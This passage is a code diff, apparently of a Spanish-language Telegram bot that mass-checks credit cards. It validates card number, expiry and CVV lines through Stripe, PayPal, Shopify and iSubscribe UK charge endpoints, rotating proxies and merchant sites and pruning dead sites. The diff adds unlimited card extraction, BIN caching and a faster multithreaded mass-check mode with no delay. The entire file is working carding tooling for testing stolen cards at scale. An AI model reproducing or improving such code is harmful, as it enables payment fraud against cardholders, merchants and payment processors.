@@ -34,6 +34,10 @@ proxy_index = 0
 sitio_lock = Lock()
 proxy_lock = Lock()
 
+# Cache para BINs (evita consultas repetidas)
+bin_cache = {}
+bin_cache_lock = Lock()
+
 # ==================== FUNCIONES DE BASE DE DATOS ====================
 
 def get_db_connection():
@@ -116,33 +120,24 @@ def init_database():
 # Inicializar BD
 init_database()
 
-# ==================== FUNCIONES DE EXTRACCIÓN MEJORADAS ====================
+# ==================== FUNCIONES DE EXTRACCIÓN ====================
 
 def extraer_urls_de_texto(texto):
-    """
-    Extrae SOLO URLs de cualquier texto, ignorando precios, números, etc.
-    Ejemplo: "11. https://www.bioseaweedgel.com - $10.25" -> "https://www.bioseaweedgel.com"
-    """
-    # Patrón para encontrar URLs
+    """Extrae SOLO URLs de cualquier texto"""
     patron = r'https?://[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(?:/[^\s<>"\']*)?'
-    
     urls = re.findall(patron, texto, re.IGNORECASE)
     
-    # Limpiar URLs: eliminar caracteres no deseados al final
     urls_limpias = []
     for url in urls:
         url = url.strip()
-        # Eliminar caracteres como puntos, comas, paréntesis al final
         url = re.sub(r'[.,;:)\]}>"\']+$', '', url)
-        # Eliminar parámetros comunes al final
         url = re.sub(r'\?.*$', '', url)
-        # Eliminar fragmentos (#)
         url = re.sub(r'#.*$', '', url)
         
         if url.startswith('http'):
             urls_limpias.append(url)
     
-    # Eliminar duplicados y mantener orden
+    # Eliminar duplicados
     urls_vistas = []
     resultado = []
     for url in urls_limpias:
@@ -153,11 +148,7 @@ def extraer_urls_de_texto(texto):
     return resultado
 
 def extraer_proxies_de_texto(texto):
-    """
-    Extrae proxies de cualquier texto (formato libre)
-    Detecta formatos: ip:puerto o ip:puerto:user:pass
-    """
-    # Patrón para IP:Puerto (con o sin autenticación)
+    """Extrae proxies de cualquier texto"""
     patron_proxy = re.compile(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})(?::([^:\s]+):([^:\s]+))?\b')
     
     proxies = []
@@ -167,7 +158,6 @@ def extraer_proxies_de_texto(texto):
         user = match.group(3)
         pwd = match.group(4)
         
-        # Validar que la IP sea válida
         partes_ip = ip.split('.')
         ip_valida = all(0 <= int(p) <= 255 for p in partes_ip)
         
@@ -177,16 +167,29 @@ def extraer_proxies_de_texto(texto):
             else:
                 proxy = f"{ip}:{puerto}"
             
-            # Validar que el puerto sea válido (1-65535)
             if 1 <= int(puerto) <= 65535:
                 proxies.append(proxy)
     
     return list(set(proxies))
 
+def extraer_tarjetas_de_texto(texto):
+    """Extrae TODAS las tarjetas SIN LÍMITE"""
+    lineas = texto.strip().split('\n')
+    tarjetas = []
+    
+    for linea in lineas:
+        linea = linea.strip()
+        if '|' in linea:
+            partes = linea.split('|')
+            if len(partes) == 4:
+                if all(p.isdigit() for p in partes):
+                    tarjetas.append(linea)
+    
+    return tarjetas
+
 # ==================== FUNCIONES DE PROXIES ====================
 
 def guardar_proxy(proxy):
-    """Guarda un proxy en la base de datos"""
     conn = None
     try:
         conn = get_db_connection()
@@ -203,7 +206,6 @@ def guardar_proxy(proxy):
             conn.close()
 
 def obtener_proxies():
-    """Obtiene todos los proxies"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("SELECT proxy FROM proxies")
@@ -212,7 +214,6 @@ def obtener_proxies():
     return proxies
 
 def obtener_proximo_proxy():
-    """Obtiene el próximo proxy en rotación (Round Robin)"""
     global proxy_index
     with proxy_lock:
         proxies = obtener_proxies()
@@ -223,7 +224,6 @@ def obtener_proximo_proxy():
         return proxy
 
 def obtener_proxies_con_estadisticas():
-    """Obtiene proxies con sus estadísticas"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("SELECT proxy, successes, failures, last_test, status FROM proxies ORDER BY successes DESC, failures ASC")
@@ -232,7 +232,6 @@ def obtener_proxies_con_estadisticas():
     return resultados
 
 def eliminar_proxy(proxy):
-    """Elimina un proxy específico"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("DELETE FROM proxies WHERE proxy = ?", (proxy,))
@@ -242,7 +241,6 @@ def eliminar_proxy(proxy):
     return filas > 0
 
 def eliminar_todos_proxies():
-    """Elimina TODOS los proxies de la base de datos"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("DELETE FROM proxies")
@@ -252,7 +250,6 @@ def eliminar_todos_proxies():
     return filas
 
 def eliminar_proxies_muertos():
-    """Elimina todos los proxies marcados como 'dead'"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("DELETE FROM proxies WHERE status = 'dead'")
@@ -262,7 +259,6 @@ def eliminar_proxies_muertos():
     return filas
 
 def actualizar_estadisticas_proxy(proxy, success):
-    """Actualiza estadísticas de un proxy"""
     conn = get_db_connection()
     cursor = conn.cursor()
     campo = "successes" if success else "failures"
@@ -272,7 +268,6 @@ def actualizar_estadisticas_proxy(proxy, success):
     conn.close()
 
 def actualizar_status_proxy(proxy, status, tiempo):
-    """Actualiza el status del proxy después del test"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("UPDATE proxies SET status = ?, last_test = ? WHERE proxy = ?",
@@ -283,7 +278,6 @@ def actualizar_status_proxy(proxy, status, tiempo):
 # ==================== FUNCIONES PARA SITIOS ====================
 
 def guardar_sitio(url):
-    """Guarda un sitio en la base de datos"""
     conn = None
     try:
         conn = get_db_connection()
@@ -300,7 +294,6 @@ def guardar_sitio(url):
             conn.close()
 
 def obtener_sitios():
-    """Obtiene todos los sitios"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("SELECT url FROM sitios")
@@ -309,7 +302,6 @@ def obtener_sitios():
     return sitios
 
 def obtener_proximo_sitio():
-    """Obtiene el próximo sitio en rotación (Round Robin)"""
     global sitio_index
     with sitio_lock:
         sitios = obtener_sitios()
@@ -320,7 +312,6 @@ def obtener_proximo_sitio():
         return sitio
 
 def obtener_sitios_con_estadisticas():
-    """Obtiene sitios con sus estadísticas"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("SELECT url, successes, failures, last_used FROM sitios ORDER BY successes DESC, failures ASC")
@@ -329,7 +320,6 @@ def obtener_sitios_con_estadisticas():
     return resultados
 
 def eliminar_sitio(url):
-    """Elimina un sitio específico"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("DELETE FROM sitios WHERE url = ?", (url,))
@@ -339,7 +329,6 @@ def eliminar_sitio(url):
     return filas > 0
 
 def eliminar_todos_sitios():
-    """Elimina TODOS los sitios de la base de datos"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("DELETE FROM sitios")
@@ -349,7 +338,6 @@ def eliminar_todos_sitios():
     return filas
 
 def actualizar_estadisticas_sitio(url, success):
-    """Actualiza estadísticas de un sitio"""
     conn = get_db_connection()
     cursor = conn.cursor()
     campo = "successes" if success else "failures"
@@ -361,49 +349,23 @@ def actualizar_estadisticas_sitio(url, success):
 # ==================== LIMPIEZA AUTOMÁTICA DE SITIOS ====================
 
 def limpiar_sitios_muertos():
-    """
-    Elimina automáticamente los sitios que NO devuelven respuestas válidas.
-    Respuestas válidas: 3D Secure, Charge, Approved, Decline, CAPTCHA_REQUIRED
-    """
     conn = get_db_connection()
     cursor = conn.cursor()
     
     cursor.execute("SELECT id, url, failures FROM sitios")
     sitios = cursor.fetchall()
     
-    # Respuestas válidas que queremos mantener
     respuestas_validas = [
-        '3d secure',
-        '3ds',
-        'charge',
-        'approved',
-        'declined',
-        'captcha_required',
-        'captcha required'
+        '3d secure', '3ds', 'charge', 'approved', 'declined',
+        'captcha_required', 'captcha required'
     ]
     
-    # Respuestas que indican sitio muerto (incluye r4 token empty)
     respuestas_muertas = [
-        'py id empty',
-        'r4 token empty',
-        'token empty',
-        'invalid token',
-        'empty response',
-        'no response',
-        'null response',
-        'api error',
-        '404',
-        '500',
-        '502',
-        '503',
-        'not found',
-        'connection refused',
-        'timeout',
-        'ssl error',
-        'page not found',
-        'access denied',
-        'forbidden',
-        'server error'
+        'py id empty', 'r4 token empty', 'token empty', 'invalid token',
+        'empty response', 'no response', 'null response', 'api error',
+        '404', '500', '502', '503', 'not found', 'connection refused',
+        'timeout', 'ssl error', 'page not found', 'access denied',
+        'forbidden', 'server error'
     ]
     
     eliminados = 0
@@ -415,20 +377,15 @@ def limpiar_sitios_muertos():
         try:
             cc_prueba = "4242424242424242|12|25|123"
             resultado = verificar_api_autoshopify(cc_prueba, url)
-            
             mensaje = resultado.get('message', '').lower()
             
-            # Verificar si la respuesta es válida
             es_valida = any(rv in mensaje for rv in respuestas_validas)
-            
-            # Verificar si el sitio está muerto
             es_muerto = any(rm in mensaje for rm in respuestas_muertas)
             
-            # Si es muerto o tiene demasiados fallos, eliminar
             if es_muerto or (not es_valida and failures >= 3):
                 cursor.execute("DELETE FROM sitios WHERE id = ?", (sitio_id,))
                 eliminados += 1
-                print(f"🗑️ Sitio eliminado: {url} - Motivo: {'muerto' if es_muerto else 'respuesta inválida'}")
+                print(f"🗑️ Sitio eliminado: {url}")
             
         except Exception as e:
             if failures >= 3:
@@ -441,7 +398,6 @@ def limpiar_sitios_muertos():
     return eliminados
 
 def limpiar_sitios_programado():
-    """Función para ejecutar la limpieza cada hora"""
     while True:
         time.sleep(3600)
         try:
@@ -451,46 +407,31 @@ def limpiar_sitios_programado():
         except Exception as e:
             print(f"❌ Error en limpieza programada: {e}")
 
-# Iniciar el hilo de limpieza automática
 limpieza_thread = Thread(target=limpiar_sitios_programado, daemon=True)
 limpieza_thread.start()
 
 # ==================== FUNCIONES DE TARJETAS ====================
 
-def guardar_tarjetas_desde_texto(texto):
-    """Guarda tarjetas desde un archivo de texto"""
-    lineas = texto.strip().split('\n')
+def guardar_tarjetas_desde_lista(tarjetas):
     guardadas = 0
     repetidas = 0
-    invalidas = 0
     
     conn = get_db_connection()
     cursor = conn.cursor()
     
-    for linea in lineas:
-        linea = linea.strip()
-        if not linea:
-            continue
-        partes = linea.split('|')
-        if len(partes) == 4:
-            if all(p.isdigit() for p in partes):
-                try:
-                    cursor.execute("INSERT INTO tarjetas (cc, fecha) VALUES (?, ?)",
-                                  (linea, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
-                    conn.commit()
-                    guardadas += 1
-                except:
-                    repetidas += 1
-            else:
-                invalidas += 1
-        else:
-            invalidas += 1
+    for cc in tarjetas:
+        try:
+            cursor.execute("INSERT INTO tarjetas (cc, fecha) VALUES (?, ?)",
+                          (cc, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+            conn.commit()
+            guardadas += 1
+        except:
+            repetidas += 1
     
     conn.close()
-    return guardadas, repetidas, invalidas
+    return guardadas, repetidas
 
 def obtener_todas_tarjetas():
-    """Obtiene todas las tarjetas"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("SELECT cc, fecha, veces_verificada FROM tarjetas ORDER BY fecha DESC")
@@ -499,7 +440,6 @@ def obtener_todas_tarjetas():
     return resultados
 
 def aumentar_contador_tarjeta(cc):
-    """Aumenta el contador de verificaciones de una tarjeta"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("UPDATE tarjetas SET veces_verificada = veces_verificada + 1 WHERE cc = ?",
@@ -508,7 +448,6 @@ def aumentar_contador_tarjeta(cc):
     conn.close()
 
 def eliminar_tarjeta(cc):
-    """Elimina una tarjeta específica"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("DELETE FROM tarjetas WHERE cc = ?", (cc,))
@@ -518,7 +457,6 @@ def eliminar_tarjeta(cc):
     return filas > 0
 
 def eliminar_todas_tarjetas():
-    """Elimina TODAS las tarjetas"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("DELETE FROM tarjetas")
@@ -528,7 +466,6 @@ def eliminar_todas_tarjetas():
     return filas
 
 def guardar_historial(cc, proxy, gate, amount, status, message, gates, bin_info):
-    """Guarda una verificación en el historial"""
     if isinstance(bin_info, dict):
         bin_info_str = json.dumps(bin_info)
     else:
@@ -548,7 +485,6 @@ def guardar_historial(cc, proxy, gate, amount, status, message, gates, bin_info)
     aumentar_contador_tarjeta(cc)
 
 def obtener_estadisticas():
-    """Obtiene estadísticas globales"""
     conn = get_db_connection()
     cursor = conn.cursor()
     
@@ -581,17 +517,22 @@ def obtener_estadisticas():
         'aprobadas': total_success or 0
     }
 
-# ==================== FUNCIÓN DE CONSULTA BIN ====================
+# ==================== FUNCIÓN DE CONSULTA BIN CON CACHE ====================
 
 def get_emoji_flag(country_code):
-    """Convierte código de país a emoji de bandera"""
     if not country_code or len(country_code) != 2:
         return '🌍'
     flag = ''.join(chr(127397 + ord(c)) for c in country_code.upper())
     return flag
 
-def consultar_bin(bin_number):
-    """Consulta información de BIN usando múltiples APIs"""
+def consultar_bin_con_cache(bin_number):
+    """Consulta BIN con cache para evitar llamadas repetidas"""
+    global bin_cache
+    
+    with bin_cache_lock:
+        if bin_number in bin_cache:
+            return bin_cache[bin_number]
+    
     bin_number = bin_number[:6]
     
     try:
@@ -602,7 +543,7 @@ def consultar_bin(bin_number):
         if response.status_code == 200:
             data = response.json()
             if data:
-                return {
+                resultado = {
                     'scheme': data.get('scheme', 'UNKNOWN').upper(),
                     'type': data.get('type', 'UNKNOWN').upper(),
                     'brand': data.get('brand', data.get('scheme', 'UNKNOWN')).upper(),
@@ -612,40 +553,33 @@ def consultar_bin(bin_number):
                     'bank': data.get('bank', {}).get('name', 'Unknown'),
                     'prepaid': data.get('prepaid', False)
                 }
+            else:
+                resultado = {
+                    'scheme': 'UNKNOWN', 'type': 'UNKNOWN', 'brand': 'UNKNOWN',
+                    'country': 'Unknown', 'country_code': 'XX', 'country_emoji': '🌍',
+                    'bank': 'Unknown', 'prepaid': False
+                }
+        else:
+            resultado = {
+                'scheme': 'UNKNOWN', 'type': 'UNKNOWN', 'brand': 'UNKNOWN',
+                'country': 'Unknown', 'country_code': 'XX', 'country_emoji': '🌍',
+                'bank': 'Unknown', 'prepaid': False
+            }
     except Exception:
-        pass
+        resultado = {
+            'scheme': 'UNKNOWN', 'type': 'UNKNOWN', 'brand': 'UNKNOWN',
+            'country': 'Unknown', 'country_code': 'XX', 'country_emoji': '🌍',
+            'bank': 'Unknown', 'prepaid': False
+        }
     
-    return {
-        'scheme': 'UNKNOWN',
-        'type': 'UNKNOWN',
-        'brand': 'UNKNOWN',
-        'country': 'Unknown',
-        'country_code': 'XX',
-        'country_emoji': '🌍',
-        'bank': 'Unknown',
-        'prepaid': False
-    }
-
-# ==================== FUNCIÓN AUXILIAR CAPTURE ====================
-
-def capture(text, start_str, end_str):
-    """Extrae texto entre dos marcadores"""
-    try:
-        start = text.find(start_str)
-        if start == -1:
-            return ""
-        start += len(start_str)
-        end = text.find(end_str, start)
-        if end == -1:
-            return ""
-        return text[start:end].strip()
-    except:
-        return ""
+    with bin_cache_lock:
+        bin_cache[bin_number] = resultado
+    
+    return resultado
 
 # ==================== FUNCIÓN DE VERIFICACIÓN STRIPE $1 NO AVS ====================
 
 def verificar_api_stripe_noavs(cc, proxy=None):
-    """Verifica usando Stripe $1.00 No AVS"""
     try:
         api_url = f"https://samurai-api-hub.up.railway.app/api/check5?c={cc}"
         if proxy:
@@ -700,7 +634,6 @@ def verificar_api_stripe_noavs(cc, proxy=None):
 # ==================== FUNCIONES DE VERIFICACIÓN PAYPAL ====================
 
 def verificar_api_paypal(cc, gate=1, proxy=None):
-    """Verifica usando PayPal con diferentes montos"""
     gates = {
         1: {"endpoint": "/pp/check", "amount": "10.00", "name": "PayPal $10"},
         2: {"endpoint": "/pp/check2", "amount": "0.10", "name": "PayPal $0.10"},
@@ -762,7 +695,6 @@ def verificar_api_paypal(cc, gate=1, proxy=None):
 # ==================== FUNCIÓN DE VERIFICACIÓN AUTOSHOPIFY ====================
 
 def verificar_api_autoshopify(cc, url, proxy=None):
-    """Verifica usando AutoShopify API"""
     try:
         api_url = f"https://auto-shopify-api-production.up.railway.app/index.php?site={url}&cc={cc}"
         
@@ -820,8 +752,20 @@ def verificar_api_autoshopify(cc, url, proxy=None):
 
 # ==================== FUNCIÓN DE VERIFICACIÓN iSubscribe UK ====================
 
+def capture(text, start_str, end_str):
+    try:
+        start = text.find(start_str)
+        if start == -1:
+            return ""
+        start += len(start_str)
+        end = text.find(end_str, start)
+        if end == -1:
+            return ""
+        return text[start:end].strip()
+    except:
+        return ""
+
 def verificar_isubscribe(cc, proxy=None):
-    """Verifica tarjeta comprando una suscripción en iSubscribe UK"""
     start_time = time.time()
     session = requests.Session()
     
@@ -1064,8 +1008,6 @@ def verificar_isubscribe(cc, proxy=None):
 # ==================== FORMATO PREMIUM PARA RESULTADOS ====================
 
 def formato_check_premium(cc, resultado_api, bin_info, tiempo, user_name="User", gate_type="Stripe"):
-    """Formato premium con diseño tipo checker profesional"""
-    
     if resultado_api['status'] == 'success':
         estado_verif = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅"
         color_estado = "✅"
@@ -1161,7 +1103,6 @@ def formato_check_premium(cc, resultado_api, bin_info, tiempo, user_name="User",
 proxy_semaphore = threading.Semaphore(50)
 
 def test_proxy_rapido(proxy):
-    """Prueba un proxy de manera ultra rápida"""
     with proxy_semaphore:
         try:
             start_time = time.time()
@@ -1204,7 +1145,6 @@ def test_proxy_rapido(proxy):
 
 @bot.message_handler(commands=['px', 'pxfast', 'proxytest'])
 def cmd_test_proxies_ultra_rapido(message):
-    """Versión ULTRA RÁPIDA de test de proxies"""
     proxies = obtener_proxies()
     total = len(proxies)
     
@@ -1360,8 +1300,8 @@ def cmd_menu(message):
         "║  📦 Masivos:                ║\n"
         "║  • /mass - Stripe          ║\n"
         "║  • /mpp - PayPal ($0.10)   ║\n"
-        "║  • /msh - Shopify          ║\n"
-        "║  • /muk - iSubscribe UK    ║\n"
+        "║  • /msh - Shopify (RÁPIDO) ║\n"
+        "║  • /muk - iSubscribe (RÁPIDO)║\n"
         "║                            ║\n"
         "║  ⚡ Otros:                  ║\n"
         "║  • /px - Test proxies      ║\n"
@@ -1386,8 +1326,8 @@ def cmd_help(message):
         "║  • /uk CC - iSubscribe UK  ║\n"
         "║  • /mass - Stripe masivo   ║\n"
         "║  • /mpp - PayPal masivo    ║\n"
-        "║  • /msh - Shopify masivo   ║\n"
-        "║  • /muk - iSubscribe masivo║\n"
+        "║  • /msh - Shopify masivo (RÁPIDO)║\n"
+        "║  • /muk - iSubscribe masivo (RÁPIDO)║\n"
         "║  • /px - Test proxies      ║\n"
         "║  • /cleansites - Limpiar   ║\n"
         "║  • /exportproxies - Exportar║\n"
@@ -1399,7 +1339,6 @@ def cmd_help(message):
 
 @bot.message_handler(commands=['addsh'])
 def cmd_add_sitio(message):
-    """Agrega un sitio"""
     try:
         url = message.text.split()[1]
         if guardar_sitio(url):
@@ -1411,7 +1350,6 @@ def cmd_add_sitio(message):
 
 @bot.message_handler(commands=['sitios'])
 def cmd_listar_sitios(message):
-    """Lista todos los sitios"""
     sitios = obtener_sitios_con_estadisticas()
     
     if not sitios:
@@ -1432,7 +1370,6 @@ def cmd_listar_sitios(message):
 
 @bot.message_handler(commands=['delsh'])
 def cmd_del_sitio(message):
-    """Elimina un sitio"""
     try:
         url = message.text.split()[1]
         if eliminar_sitio(url):
@@ -1444,7 +1381,6 @@ def cmd_del_sitio(message):
 
 @bot.message_handler(commands=['delallsitios'])
 def cmd_del_all_sitios(message):
-    """Elimina TODOS los sitios"""
     confirmacion = types.InlineKeyboardMarkup()
     btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_sitios')
     btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_sitios')
@@ -1459,7 +1395,6 @@ def cmd_del_all_sitios(message):
 
 @bot.message_handler(commands=['cleansites'])
 def cmd_clean_sites(message):
-    """Limpia manualmente los sitios que no funcionan"""
     msg = bot.reply_to(message, "🧹 Limpiando sitios muertos...")
     
     try:
@@ -1481,7 +1416,6 @@ han sido eliminados automáticamente."""
 
 @bot.message_handler(commands=['exportproxies', 'exportarproxies'])
 def cmd_export_proxies(message):
-    """Exporta todos los proxies a un archivo TXT"""
     proxies = obtener_proxies()
     
     if not proxies:
@@ -1510,7 +1444,6 @@ def cmd_export_proxies(message):
 
 @bot.message_handler(commands=['check5'])
 def cmd_check_5(message):
-    """Verificar con Stripe $1 No AVS"""
     try:
         cc = message.text.split()[1]
         
@@ -1524,7 +1457,7 @@ def cmd_check_5(message):
         
         msg = bot.reply_to(message, "🔍 Verificando con Stripe $1 No AVS...")
         
-        bin_info = consultar_bin(bin_num)
+        bin_info = consultar_bin_con_cache(bin_num)
         user_name = message.from_user.first_name if message.from_user else "User"
         
         proxy = obtener_proximo_proxy()
@@ -1546,7 +1479,6 @@ def cmd_check_5(message):
 
 @bot.message_handler(commands=['pp'])
 def cmd_pp(message):
-    """Verificar con PayPal $10.00"""
     try:
         cc = message.text.split()[1]
         
@@ -1560,7 +1492,7 @@ def cmd_pp(message):
         
         msg = bot.reply_to(message, "🔍 Verificando con PayPal $10.00...")
         
-        bin_info = consultar_bin(bin_num)
+        bin_info = consultar_bin_con_cache(bin_num)
         user_name = message.from_user.first_name if message.from_user else "User"
         
         proxy = obtener_proximo_proxy()
@@ -1582,7 +1514,6 @@ def cmd_pp(message):
 
 @bot.message_handler(commands=['pp2'])
 def cmd_pp2(message):
-    """Verificar con PayPal $0.10"""
     try:
         cc = message.text.split()[1]
         
@@ -1596,7 +1527,7 @@ def cmd_pp2(message):
         
         msg = bot.reply_to(message, "🔍 Verificando con PayPal $0.10...")
         
-        bin_info = consultar_bin(bin_num)
+        bin_info = consultar_bin_con_cache(bin_num)
         user_name = message.from_user.first_name if message.from_user else "User"
         
         proxy = obtener_proximo_proxy()
@@ -1618,7 +1549,6 @@ def cmd_pp2(message):
 
 @bot.message_handler(commands=['pp3'])
 def cmd_pp3(message):
-    """Verificar con PayPal $1.00"""
     try:
         cc = message.text.split()[1]
         
@@ -1632,7 +1562,7 @@ def cmd_pp3(message):
         
         msg = bot.reply_to(message, "🔍 Verificando con PayPal $1.00...")
         
-        bin_info = consultar_bin(bin_num)
+        bin_info = consultar_bin_con_cache(bin_num)
         user_name = message.from_user.first_name if message.from_user else "User"
         
         proxy = obtener_proximo_proxy()
@@ -1654,7 +1584,6 @@ def cmd_pp3(message):
 
 @bot.message_handler(commands=['sh'])
 def cmd_shopify(message):
-    """Verificar con AutoShopify - CON ROTACIÓN DE SITIOS Y PROXIES"""
     try:
         partes = message.text.split()
         cc = partes[1]
@@ -1682,7 +1611,7 @@ def cmd_shopify(message):
         
         msg = bot.reply_to(message, f"🔄 Verificando con AutoShopify...\n📍 Sitio: {url[:40]}...\n🌐 Proxy: {proxy[:30] if proxy else 'directo'}...")
         
-        bin_info = consultar_bin(bin_num)
+        bin_info = consultar_bin_con_cache(bin_num)
         user_name = message.from_user.first_name if message.from_user else "User"
         
         resultado = verificar_api_autoshopify(cc, url, proxy)
@@ -1706,7 +1635,6 @@ def cmd_shopify(message):
 
 @bot.message_handler(commands=['uk'])
 def cmd_uk(message):
-    """Verificar con iSubscribe UK (£4.00)"""
     try:
         cc = message.text.split()[1]
         
@@ -1719,7 +1647,7 @@ def cmd_uk(message):
         
         msg = bot.reply_to(message, "🇬🇧 Verificando con iSubscribe UK (£4.00)...")
         
-        bin_info = consultar_bin(bin_num)
+        bin_info = consultar_bin_con_cache(bin_num)
         user_name = message.from_user.first_name if message.from_user else "User"
         
         proxy = obtener_proximo_proxy()
@@ -1739,11 +1667,10 @@ def cmd_uk(message):
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {str(e)}")
 
-# ==================== COMANDOS MASIVOS (RESUMIDOS) ====================
+# ==================== VERIFICACIÓN MASIVA STRIPE ====================
 
 @bot.message_handler(commands=['mass'])
 def cmd_mass_stripe(message):
-    """Verificación masiva con Stripe $1 No AVS"""
     tarjetas = obtener_todas_tarjetas()
     
     if not tarjetas:
@@ -1803,7 +1730,7 @@ def procesar_masivo_stripe(task_id, chat_id, delay, notificar_cada):
             bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
             break
         
-        bin_info = consultar_bin(card[:6])
+        bin_info = consultar_bin_con_cache(card[:6])
         proxy = obtener_proximo_proxy()
         resultado = verificar_api_stripe_noavs(card, proxy)
         
@@ -1878,9 +1805,10 @@ def procesar_masivo_stripe(task_id, chat_id, delay, notificar_cada):
     if task_id in active_tasks:
         del active_tasks[task_id]
 
+# ==================== VERIFICACIÓN MASIVA PAYPAL ====================
+
 @bot.message_handler(commands=['mpp'])
 def cmd_mass_paypal(message):
-    """Verificación masiva con PayPal $0.10"""
     tarjetas = obtener_todas_tarjetas()
     
     if not tarjetas:
@@ -1940,7 +1868,7 @@ def procesar_masivo_paypal(task_id, chat_id, delay, notificar_cada):
             bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
             break
         
-        bin_info = consultar_bin(card[:6])
+        bin_info = consultar_bin_con_cache(card[:6])
         proxy = obtener_proximo_proxy()
         resultado = verificar_api_paypal(card, gate=2, proxy=proxy)
         
@@ -2015,9 +1943,11 @@ def procesar_masivo_paypal(task_id, chat_id, delay, notificar_cada):
     if task_id in active_tasks:
         del active_tasks[task_id]
 
+# ==================== VERIFICACIÓN MASIVA SHOPIFY (VERSIÓN RÁPIDA) ====================
+
 @bot.message_handler(commands=['msh'])
-def cmd_mass_shopify(message):
-    """Verificación masiva con AutoShopify - CON ROTACIÓN Y LIMPIEZA"""
+def cmd_mass_shopify_rapido(message):
+    """Verificación masiva con AutoShopify - VERSIÓN RÁPIDA CON HILOS"""
     tarjetas = obtener_todas_tarjetas()
     sitios = obtener_sitios()
     
@@ -2030,8 +1960,9 @@ def cmd_mass_shopify(message):
         return
     
     texto = message.text.split()
-    delay = 3
+    delay = 0
     notificar_cada = 10
+    max_hilos = 10
     
     for i, arg in enumerate(texto):
         if arg == '--delay' and i+1 < len(texto):
@@ -2044,30 +1975,35 @@ def cmd_mass_shopify(message):
                 notificar_cada = int(texto[i+1])
             except:
                 pass
+        elif arg == '--hilos' and i+1 < len(texto):
+            try:
+                max_hilos = int(texto[i+1])
+            except:
+                pass
     
     task_id = f"msh_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
     
     active_tasks[task_id] = {'chat_id': message.chat.id, 'cancel': False}
     
-    config = f"""🛍️ VERIFICACIÓN MASIVA SHOPIFY (CON ROTACIÓN)
+    config = f"""🛍️ VERIFICACIÓN MASIVA SHOPIFY (MODO RÁPIDO)
 ━━━━━━━━━━━━━━━━━━━━━━
 📌 Tarjetas: {len(tarjetas)}
 🌐 Sitios: {len(sitios)}
-⏱️ Delay: {delay}s
+⚡ Hilos en paralelo: {max_hilos}
 🔔 Notificar: cada {notificar_cada}
 🆔 ID: {task_id}
 🧹 Sitios malos se eliminan automáticamente
-🔄 Sitios y proxies rotativos
 
 /cancelar_{task_id} - Cancelar"""
     
     bot.reply_to(message, config)
     
-    thread = Thread(target=procesar_masivo_shopify, args=(task_id, message.chat.id, delay, notificar_cada))
+    thread = Thread(target=procesar_masivo_shopify_rapido, 
+                   args=(task_id, message.chat.id, delay, notificar_cada, max_hilos))
     thread.daemon = True
     thread.start()
 
-def procesar_masivo_shopify(task_id, chat_id, delay, notificar_cada):
+def procesar_masivo_shopify_rapido(task_id, chat_id, delay, notificar_cada, max_hilos=10):
     cards = [c[0] for c in obtener_todas_tarjetas()]
     sitios = obtener_sitios()
     total_tarjetas = len(cards)
@@ -2077,88 +2013,125 @@ def procesar_masivo_shopify(task_id, chat_id, delay, notificar_cada):
         bot.send_message(chat_id, "📭 No hay tarjetas o sitios suficientes")
         return
     
-    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Shopify (con rotación automática)...")
+    msg = bot.send_message(chat_id, f"⚡ Iniciando verificación rápida Shopify con {max_hilos} hilos...")
     
-    procesadas = 0
     resultados = {'success': 0, 'failed': 0, 'error': 0, 'sitios_eliminados': 0}
     detalles = []
     start_time = time.time()
     
+    # Cache de BINs
+    bin_cache_local = {}
+    sitios_a_eliminar = []
+    
+    # Función para procesar una tarjeta
+    def procesar_tarjeta(card, sitio, proxy):
+        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
+            return None
+        
+        bin_key = card[:6]
+        if bin_key in bin_cache_local:
+            bin_info = bin_cache_local[bin_key]
+        else:
+            bin_info = consultar_bin_con_cache(bin_key)
+            bin_cache_local[bin_key] = bin_info
+        
+        resultado = verificar_api_autoshopify(card, sitio, proxy)
+        
+        if resultado:
+            mensaje = resultado.get('message', '').lower()
+            respuestas_muertas = ['py id empty', '404', 'not found', 'connection refused', 'r4 token empty', 'token empty']
+            
+            es_muerto = any(rm in mensaje for rm in respuestas_muertas)
+            
+            if es_muerto:
+                return ('eliminar_sitio', sitio, card, resultado)
+            else:
+                guardar_historial(card, resultado['proxy'], f"Shopify ${resultado['amount']}", 
+                                resultado['amount'], resultado['status'], 
+                                resultado['message'], resultado['gates'], bin_info)
+                actualizar_estadisticas_sitio(sitio, resultado['success'])
+                
+                if resultado['status'] == 'success':
+                    return ('success', card, resultado['message'][:50])
+                elif resultado['status'] == 'failed':
+                    return ('failed', card, resultado['message'][:50])
+                else:
+                    return ('error', card, resultado['message'][:50])
+        return ('error', card, 'Sin resultado')
+    
+    # Preparar trabajos
+    trabajos = []
+    proxy_index_local = 0
     proxies = obtener_proxies()
     total_proxies = len(proxies)
     
-    sitio_index_local = 0
-    proxy_index_local = 0
-    sitios_a_eliminar = []
-    
-    for i, card in enumerate(cards, 1):
-        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
